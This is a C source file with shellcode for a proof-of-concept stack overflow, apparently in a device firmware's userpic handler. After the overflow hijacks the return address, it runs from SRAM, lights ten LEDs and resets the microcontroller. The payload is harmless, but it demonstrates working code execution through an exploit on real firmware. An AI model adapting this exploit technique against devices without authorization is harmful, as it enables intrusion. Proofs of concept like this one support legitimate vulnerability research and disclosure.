/*
 * LED shellcode for userpic overflow PoC.
 *
 * Compiled to run from SRAM (cmd_buf staging area) after stack overflow
 * redirects saved LR to shellcode_entry. Sets LEDs 0-9 to white
 * sequentially with 500ms delays, then resets the MCU.
 *
 * Build:  make shellcode
 * Output: shellcode_led.bin (loaded by poc_userpic_overflow.py --led)
 */
#include "fw_v407_macro.h"

/* Size of the WS2812 frame/DMA buffers (82 LEDs * 24 bytes each). */
#define LED_BUF_SIZE  0x7B0

void __attribute__((noreturn, section(".text.entry")))
shellcode_entry(void)
{
    for (int i = 0; i < 10; i++) {
        /* Write RGB data into the software frame buffer. */
        ws2812_set_pixel(i, 255, 255, 255, 255);

        /* Copy frame buffer -> DMA buffer so the hardware outputs it.
         * The DMA/SPI is already running from ws2812_hw_init();
         * we just need to update the source buffer it reads from. */
        memcpy((void *)g_led_dma_buf, (void *)g_led_frame_buf,
               LED_BUF_SIZE);

        delay_ms(500);
    }

    nvic_system_reset();
    __builtin_unreachable();
}
